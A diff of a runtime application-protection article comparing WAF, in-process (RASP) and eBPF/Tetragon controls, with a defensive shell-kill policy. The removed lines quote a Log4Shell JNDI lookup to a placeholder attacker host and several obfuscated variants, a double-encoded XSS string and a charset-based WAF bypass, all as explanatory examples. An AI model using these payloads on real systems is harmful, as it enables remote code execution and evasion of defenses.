@@ -1,180 +1,161 @@
 ---
-title: "Runtime Application Protection: Comparing WAF and RASP Architectures, eBPF Filtering, and Evasion Mitigation"
-type: appsec
-tags: [WAF, RASP, eBPF, Runtime Security, Threat Detection]
-date: 2026-06
-readingTime: 16
+title: "Layered Runtime Application Protection: WAF, In-Process Controls and eBPF Enforcement"
+type: "appsec"
+tags:
+  - appsec
+  - runtime
+  - protection
+  - rasp
+  - waf
+date: "2026-07-25"
+lastReviewed: "2026-07-25"
+readingTime: 8
+reviewStatus: "partially-verified"
+validatedAgainst:
+  - "Tetragon TracingPolicy API reference — https://tetragon.io/docs/reference/tracing-policy/"
+  - "Tetragon selector and action semantics — https://tetragon.io/docs/concepts/tracing-policy/selectors/"
+  - "Tetragon policy enforcement guide — https://tetragon.io/docs/getting-started/enforcement/"
+  - "Tetragon v1.7.0 release — https://github.com/cilium/tetragon/releases/tag/v1.7.0"
+  - "Tetragon v1.7.0 namespaced policy CRD — https://github.com/cilium/tetragon/blob/v1.7.0/install/kubernetes/tetragon/crds-yaml/cilium.io_tracingpoliciesnamespaced.yaml"
+  - "AWS WAF web ACL behavior and rule model — https://docs.aws.amazon.com/waf/latest/developerguide/web-acl.html"
+sourceQuality: "primary-sources-reviewed"
+implementationStatus: "illustrative"
+reviewIntervalDays: 90
 ---
 
-# Runtime Application Protection: Comparing WAF and RASP Architectures, eBPF Filtering, and Evasion Mitigation
+# Layered Runtime Application Protection: WAF, In-Process Controls and eBPF Enforcement
 
-## Executive Summary
+No runtime control is an application security boundary by itself. Use these controls to reduce exploitability, detect abuse, and contain selected behavior while continuing to patch vulnerable components, fix authorization, isolate workloads, and test the application.
 
-Protecting web applications from modern exploits requires defending against highly sophisticated evasion techniques. Traditionally, organizations relied on Web Application Firewalls (WAFs) as their primary line of defense. WAFs inspect incoming HTTP traffic at the network edge, matching payloads against known attack signatures. While WAFs are effective for blocking common scanner traffic, they are blind to the application's internal state. Attackers exploit this limitation by obfuscating payloads to bypass WAF filters, leading to compromises on backend servers.
+## The core decision
 
-At scale, relying solely on signature-based WAFs creates a security gap. Web applications require Runtime Application Self-Protection (RASP) and eBPF-based system call auditing. These technologies run inside the application runtime or at the kernel level, analyzing what the application is actually doing rather than just inspecting the network inputs. This whitepaper compares WAF and RASP architectures, details bypass techniques using character encoding, explains how eBPF secures runtime environments, and outlines best practices for virtual patching.
+Select enforcement at the point that has the required context and an acceptable failure mode:
 
----
+- Use a **WAF** for request-layer filtering, rate controls, managed signatures, and virtual patching where its parser and placement match the traffic path.
+- Use **in-process controls** where language/runtime hooks can observe a dangerous sink with enough application context and the agent is supportable.
+- Use **eBPF or kernel runtime policy** for selected process, file, capability, and network events that can be represented at that boundary.
 
-## Threat Model and Attack Surface
+Default to detection or count mode, establish baseline and bypass tests, then enforce narrowly. A control that can terminate a process or block a syscall can also cause an outage.
 
-The runtime attack surface encompasses incoming HTTP requests, application memory, execution thread lifecycles, and host system calls.
+## Scope and threat model
 
-```
-       [ HTTP Payload with Obfuscated Command ]
-                          │
-                          ▼
-            [ Edge WAF Signature Check ]
-                          │
-       ┌──────────────────┴──────────────────┐
-       ▼ (Evasion: Double URL Encoded)       ▼ (Plain Text Signature Match)
-[ Bypass: WAF forwards request ]      [ Blocked: Connection Terminated ]
-       │
-       ▼
-[ Web Application Server Processes Request ]
-       │
-       ▼ (Decodes payload & executes system call)
-[ RASP / eBPF System Call Inspection ]
-       │
-       ▼
-[ BLOCK: Unauthorized process creation (sh / bash) ]
-```
+The model assumes an internet-facing application running in containers. Relevant threats include malformed requests, automated abuse, known exploit patterns, application parser confusion, injection reaching a runtime sink, unexpected child processes, and post-exploitation actions. It does not assume every exploit arrives through HTTP or that every runtime event reveals business intent.
 
-### Threat Vectors and Kill-Chains
+Model bypasses separately: alternate ingress, protocol upgrades, asynchronous consumers, direct service calls, unsupported runtime code, agent disablement, host access, kernel incompatibility, and trusted-but-compromised operators.
 
-1. **WAF Evasion via Obfuscation**:
-   - *Adversary Goal*: Execute remote commands on the application host.
-   - *Attack Vector*: An attacker exploits a Remote Code Execution (RCE) vulnerability (such as Log4Shell). Because the WAF matches patterns in incoming HTTP requests, the attacker obfuscates the request using nested formatting or character set encoding (e.g. `${${lower:j}ndi:ldap://attacker.com/a}`). The WAF fails to match the string and forwards the request. The application server decodes the payload, executing the malicious command.
-2. **Dynamic Command Injection**:
-   - *Adversary Goal*: Spawn an interactive shell on the application server.
-   - *Attack Vector*: An application has a file download feature that passes user inputs directly to a shell wrapper. An attacker injects command separators (`&&` or `;`) to execute arbitrary shell commands. Because this occurs within valid application execution parameters, network-level WAFs cannot detect the exploit.
-3. **Privilege Escalation via Host System Call Abuse**:
-   - *Adversary Goal*: Escape container boundaries to read host files.
-   - *Attack Vector*: An attacker exploits a vulnerability in a backend Node.js or Python application to execute system calls. They trigger `execve` to execute a binary, or try to open a sensitive system file (like `/etc/passwd`) using `openat`.
+## Control comparison
 
----
+| Dimension | WAF / edge filter | In-process control (RASP or instrumented guard) | eBPF / runtime policy |
+|----|----|----|----|
+| Enforcement location | Proxy, CDN, load balancer, or gateway | Application process or runtime | Selected kernel hooks or runtime events on the node |
+| Available context | Decoded request fields, connection metadata, reputation, rate and managed-rule state | Runtime objects, framework route, call stack, sink arguments, application state exposed by hooks | Process lineage, binary/path, syscall arguments, namespaces, capabilities, sockets, workload metadata |
+| Supported protocols/runtimes | Only protocols and encodings the deployment parses | Only supported languages, frameworks, versions and instrumented paths | Only supported kernels, hooks, argument types and product features |
+| Parser alignment | May disagree with intermediaries or the application | Closer to selected runtime sinks but still dependent on hooks and transformations | Sees kernel-level representation, not the complete application parse |
+| Bypass conditions | Alternate route, parser differential, uninspected body, allowlisted source, rule gap | Uninstrumented code, native call, agent failure, unsupported framework, tampering | Unobserved hook, alternate binary/interpreter, direct syscall, unsupported kernel, policy scope gap |
+| Failure behavior | Fail-open or fail-closed depends on topology and service mode | May fail startup, add latency, throw, log only, or block in-process | May fail policy load, miss events, kill a process, override a call, or destabilize a workload if mis-scoped |
+| Performance / availability | Rule count, body inspection, regex, network placement and managed service capacity matter | Hook density, runtime overhead, allocation and agent health matter | Probe cost, event volume, maps, kernel support and selector complexity matter |
+| Operational ownership | Edge/platform plus application teams | Application and runtime owners | Platform, kernel/runtime and workload owners |
+| Telemetry | Request, rule, action, labels, sampled body subject to redaction | Sink, stack, route and runtime decision subject to product coverage | Process, syscall, namespace, capability and workload metadata subject to hook semantics |
+| Rollback | Rule disable, scope change, count mode, web ACL detach | Agent/config disable or application redeploy | Policy disable/delete, monitor mode, workload rollback |
+| Cannot see | Complete business authorization and code paths outside inspected traffic | Unsupported code and infrastructure behavior outside the process | Complete user intent, tenant ownership, application object state, or semantic authorization |
 
-## Deep Technical Body
+## WAF boundary
 
-### WAF vs. RASP Architectural Comparison
+Modern WAFs can combine signatures, rate-based rules, reputation, behavioral logic, managed rules, and organization-specific controls. Their context is not universally “low,” and their latency is not always negligible. Inspection limits, body handling, normalization, rule ordering, regex complexity, and false positives must be measured for the actual request mix.
 
-To design a resilient runtime defense, combine network-edge inspection with internal runtime validation:
+The core risk is parser alignment: an intermediary can normalize or interpret an input differently from the application. Include double encoding, duplicate parameters, ambiguous content types, invalid Unicode, decompression, oversized bodies, chunking, and alternate routes in regression tests. Preserve the raw and normalized fields needed for investigation without logging secrets.
 
-| Feature | Web Application Firewall (WAF) | Runtime Application Self-Protection (RASP) |
-| :--- | :--- | :--- |
-| **Execution Point** | Network edge (Reverse proxy, Load balancer). | Inside the application process (JVM, CLR, Node agent). |
-| **Contextual Awareness** | **Low**: Only sees HTTP/S headers, cookies, and raw payloads. | **High**: Inspects application variables, database queries, and system calls. |
-| **Evasion Vulnerability** | **High**: Obfuscation, encoding shifts, and parser differentials can bypass signatures. | **Low**: Analyzes the final payload immediately before execution, after all decoding. |
-| **Performance Overhead** | Minimal impact on the application server. | Increases CPU usage and memory footprint of the application process. |
-| **Primary Use Cases** | Blocking DDoS attacks, bot traffic, and virtual patching. | Preventing SQL injection, RCE, and insecure deserialization. |
+## In-process controls
 
-### WAF Evasion via Encoding Shifts
-WAFs parse payloads using standard decoders. If an attacker passes a payload using an encoding format the WAF does not decode—but the backend application server does—the WAF will fail to match the attack signature.
+An in-process product may observe selected framework operations or sinks after some application parsing. It does not necessarily see the “final interpreted payload,” and coverage varies by language, runtime, framework, library, native code, reflection, and agent version. A control might block a tested SQL execution path while missing another database driver or deserialization route.
 
-#### Double URL Encoding
-An attacker sends a payload where special characters are double encoded:
-`%253cscript%253e`
-The WAF decodes it once to `%3cscript%3e` and passes it, finding no signature matches. The backend application server decodes it again to `<script>`, executing cross-site scripting.
+Treat prevention claims as testable hypotheses. Test startup failure, agent loss, unsupported versions, exception behavior, instrumentation gaps, asynchronous work, native extensions, tampering, fail-open/fail-closed behavior, and rollback. Keep authorization and input handling in application code; the runtime agent is defense in depth.
 
-#### Character Set Mismatches
-An attacker sends a request specifying `charset=ibm290` in the `Content-Type` header. If the WAF does not support the IBM290 character set, it cannot parse the request body. However, if the backend server (e.g. WebSphere) supports the character set, it decodes the payload and executes the command, bypassing the WAF.
+## eBPF and kernel runtime boundary
 
-### How RASP Protects the Runtime: The Log4Shell Mitigation Case Study
-During the Log4Shell (CVE-2021-44228) exploit, attackers bypassed WAF signatures using endless string obfuscations:
-`$ {jndi:ldap:...}`
-`${${lower:j}ndi:...}`
-`${upper:j}ndi:...`
+eBPF-based controls can observe or act on selected kernel events with useful process and workload context. That does not make them application authorization. A kernel policy generally cannot decide whether user A may update tenant B's invoice, and the visible syscall may be far removed from the vulnerable business operation.
 
-#### The RASP Defense Mechanism
-RASP does not match signatures in the incoming HTTP request. Instead, it hooks into the Java JNDI lookup methods (`javax.naming.directory.DirContext.lookup`). When the application resolves the LDAP query, the RASP agent inspects the final resolved URL parameter. If the lookup URL points to an untrusted external IP address, the RASP agent intercepts the execution thread, throws a security exception, and blocks the request.
+Selector meaning is exact. Tetragon `matchNamespaces` refers to Linux namespaces; it is not a Kubernetes namespace-name selector. Kubernetes scoping is represented by `TracingPolicyNamespaced`, its `metadata.namespace`, and supported workload selectors. Confirm hook availability and semantics on the deployed kernel.
 
----
+## Tetragon v1.7.0 schema-validated example
 
-## Defensive Architecture
+**Evidence label: schema-validated example; no live enforcement test.** The source was pinned to Tetragon [v1.7.0](https://github.com/cilium/tetragon/releases/tag/v1.7.0) (tag checkout commit `1de2ed8ebea18e56257dc59597aa13bf8f0e471e`). The manifest was validated offline against that release's official [`TracingPolicyNamespaced` CRD](https://github.com/cilium/tetragon/blob/v1.7.0/install/kubernetes/tetragon/crds-yaml/cilium.io_tracingpoliciesnamespaced.yaml).
 
-A secure runtime architecture combines edge WAF analysis, RASP code instrumentation, and eBPF-based kernel system call auditing.
+The prompt-shaped draft used `operator: In`, but the pinned v1.7.0 CRD does not permit that operator for `matchArgs`. Validation caught the mismatch; the published policy uses `Equal`, whose documented value list matches any listed value.
 
-### Architecture Topology: Defense-in-Depth Web Application Inspection
-
-```mermaid
-flowchart TD
-    REQ["Incoming HTTP Request"] --> WAF["Cloud WAF / Edge WAF"]
-    WAF -->|Blocks Bot Scans| GW["API Gateway /<br/>Load Balancer"]
-    GW --> APP["Application Worker Pods"]
-    APP --> RASP["RASP Agent<br/>JVM/CLR"]
-    APP --> EBPF["eBPF Sensor<br/>Kernel"]
-    RASP -->|Hooks DB and FS calls| BLOCKR["Block Exploit"]
-    EBPF -->|Audits execve / socket| TERM["Terminate Pod"]
-
-    style REQ fill:#2563eb,color:#fff,stroke:#1d4ed8
-    style WAF fill:#dc2626,color:#fff,stroke:#b91c1c
-    style GW fill:#0891b2,color:#fff,stroke:#0e7490
-    style APP fill:#059669,color:#fff,stroke:#047857
-    style RASP fill:#7c3aed,color:#fff,stroke:#6d28d9
-    style EBPF fill:#7c3aed,color:#fff,stroke:#6d28d9
-    style BLOCKR fill:#dc2626,color:#fff,stroke:#b91c1c
-    style TERM fill:#dc2626,color:#fff,stroke:#b91c1c
-```
-
-### eBPF System Call Filtering Policy
-Configure eBPF runtime security engines (like Cilium Tetragon) to monitor and block unauthorized system calls (such as launching a shell process from a web server).
-
-#### Tetragon TracingPolicy Configuration
-This policy blocks any Node.js container from spawning a shell execution process:
-
-```yaml
+``` yaml
 apiVersion: cilium.io/v1alpha1
-kind: TracingPolicy
+kind: TracingPolicyNamespaced
 metadata:
-  name: block-shell-execution-in-node
+  name: detect-shell-from-web-runtime
   namespace: prod
 spec:
+  podSelector:
+    matchLabels:
+      app: web
   kprobes:
-  - call: "sys_execve"
-    syscall: true
-    args:
-    - index: 0
-      type: "string" # Path of the executable binary
-    selectors:
-    - matchArgs:
-      - index: 0
-        operator: "Prefix"
-        values:
-        - "/bin/sh"
-        - "/bin/bash"
-      matchNamespaces:
-      - "prod"
-      matchActions:
-      - action: Sigkill # Instantly terminate the process
+    - call: sys_execve
+      syscall: true
+      args:
+        - index: 0
+          type: string
+      selectors:
+        - matchArgs:
+            - index: 0
+              operator: Equal
+              values:
+                - /bin/sh
+                - /bin/bash
+                - /usr/bin/sh
+                - /usr/bin/bash
+          matchActions:
+            - action: Sigkill
 ```
 
----
+<a href="tetragon-v1.7.0-shell-policy.yaml" download="">Download the schema-validated Tetragon v1.7.0 policy</a>.
 
-## Tooling and Implementation
+This narrow demonstration matches four exact path strings passed to `execve`. Tetragon documents `Sigkill` as terminating the matching process; it does not promise to terminate the pod. Kubernetes may restart a container according to its lifecycle only if the killed process causes the container to exit.
 
-Implement a robust runtime protection layer using the following tools:
+The rule is not a complete remote-code-execution control. It can miss other shells, interpreters, copied or renamed binaries, relative or alternate paths, scripts, already-running processes, direct syscalls, and behavior that does not invoke a shell. It can also kill legitimate operational or startup activity. Test it in observe-only conditions first, then in an authorized disposable cluster with representative workloads and recovery behavior.
 
-1. **ModSecurity / AWS WAF**: Deploy ModSecurity (OWASP Core Rule Set) or cloud-native WAFs to detect and block common exploits at the network edge.
-2. **Open-Source RASP (OpenRASP)**: Integrate OpenRASP (backed by Baidu) or equivalent commercial RASP agents into your application runtimes. This dynamically inspects SQL queries, file operations, and network connections.
-3. **Cilium Tetragon / Falco**: Deploy eBPF sensors in your Kubernetes clusters to audit system call execution in real time. Tetragon can kill processes immediately when they violate security policies, while Falco alerts on suspicious host activities.
+## Failure modes
 
----
+| Failure | Impact | Required control |
+|----|----|----|
+| WAF unavailable or bypassed | Requests reach the application without expected filtering | Application remains securely coded and authorized; health and route monitoring detect bypass |
+| Managed-rule update | False positives or changed coverage | Count/canary rollout, sampled decisions, version/change tracking, rapid rollback |
+| RASP hook or agent failure | Missed detection or application impact | Health signal independent of application success; tested startup and degradation policy |
+| Tetragon policy rejected | No intended observation or enforcement | CRD/schema check plus controller/agent status and policy-load alert |
+| Kernel or workload mismatch | Silent coverage gap or excessive events | Compatibility matrix and representative node tests |
+| Over-broad kill policy | Availability incident | Narrow selectors, canary namespaces, SLO guardrail, immediate policy disable procedure |
 
-## Runtime Protection Audit Checklist
+## Telemetry and operations
 
-| Item | Focus Area | Verification Step / Command | Target State |
-| :--- | :--- | :--- | :--- |
-| 1 | WAF Rule Configuration | Verify that the edge WAF utilizes the latest OWASP Core Rule Set (CRS). | Common web exploits are blocked at the perimeter. |
-| 2 | RASP Agent Status | Check if the JVM, Node, or .NET container utilizes an active RASP agent. | The agent is injected into the container runtime startup script. |
-| 3 | System Call Isolation | Verify if containers run in read-only filesystems. | `readOnlyRootFilesystem: true` is configured in pod specs. |
-| 4 | eBPF Audit Logging | Check if kernel system call alerts are forwarded to the SIEM. | Tetragon or Falco logs are monitored in real time. |
-| 5 | Virtual Patching | Verify if rules exist to block newly disclosed CVEs. | Custom WAF rules are deployed to block new exploits before code patches are applied. |
-| 6 | Payload Size Limits | Audit request size constraints on the load balancer. | Large payloads are rejected to prevent buffer overflow attacks. |
+Correlate edge request ID, WAF rule/action/version, application route, runtime decision, workload identity, pod UID, node, binary, parent process, arguments subject to redaction, policy name/version, and kernel action. Detect telemetry loss separately from “no detections.” Limit body and argument capture, apply access controls and retention, and test that emergency rollback evidence survives.
 
----
+## Rollout, rollback and tests
+
+1. Write the exploit and legitimate-traffic hypotheses for each control.
+2. Baseline in log/count mode and measure parser coverage, overhead, event loss, and false positives.
+3. Canary one route, runtime, namespace, and node pool; run negative and bypass cases.
+4. Enforce the smallest high-confidence rule and bound its maximum availability impact.
+5. Exercise rollback: disable the exact rule or policy without removing unrelated controls.
+
+Required negative cases include alternate ingress, unsupported content type, oversized body, encoded payload variants, uninstrumented library path, agent disabled, policy load failure, other interpreter paths, renamed binary, direct syscall, legitimate administrative shell, and node/kernel mismatch.
+
+The local validation performed here was structural CRD validation only. A live test would additionally apply the official v1.7.0 CRDs and policy to an authorized disposable cluster, verify policy status, execute both matching and non-matching processes in a selected pod, confirm process-versus-container behavior, inspect events, and remove the policy.
+
+## What's still not solved
+
+Zero-days outside your rule coverage, parser differentials, a compromised allowlisted client, runtimes the agent doesn't support, native code, bugs in the agent or kernel module itself, whoever has privileged node access, telemetry loss, false positives, exception abuse, and plain old malicious behavior dressed up as a legitimate business operation — none of that goes away. Runtime enforcement narrows specific paths; it's not a replacement for patching, secure coding, authorization, sandboxing, or tenant isolation.
 
 ## References
 
-* *Bypassing Web Application Firewalls using Encoding*: [OWASP Presentation](https://owasp.org/www-pdf-archive/OWASP_AppSec_Research_2010_Bypassing_WAFs_by_Vclient.pdf)
-* *Cilium Tetragon Runtime Security Engine*: [Cilium Documentation](https://tetragon.cilium.io/docs/)
-* *NIST Special Publication 800-204C (Message-Level Security in Microservices)*: [NIST SP 800-204C](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204C.pdf)
+- [Tetragon TracingPolicy API reference](https://tetragon.io/docs/reference/tracing-policy/)
+- [Tetragon selector and action semantics](https://tetragon.io/docs/concepts/tracing-policy/selectors/)
+- [Tetragon policy enforcement guide](https://tetragon.io/docs/getting-started/enforcement/)
+- [Tetragon v1.7.0 release](https://github.com/cilium/tetragon/releases/tag/v1.7.0)
+- [Tetragon v1.7.0 namespaced policy CRD](https://github.com/cilium/tetragon/blob/v1.7.0/install/kubernetes/tetragon/crds-yaml/cilium.io_tracingpoliciesnamespaced.yaml)
+- [AWS WAF web ACL behavior and rule model](https://docs.aws.amazon.com/waf/latest/developerguide/web-acl.html)
+- [AWS WAF oversize request-component handling](https://docs.aws.amazon.com/waf/latest/developerguide/oversize-web-request-components.html)
+- [OWASP ModSecurity Core Rule Set project](https://owasp.org/www-project-modsecurity-core-rule-set/)
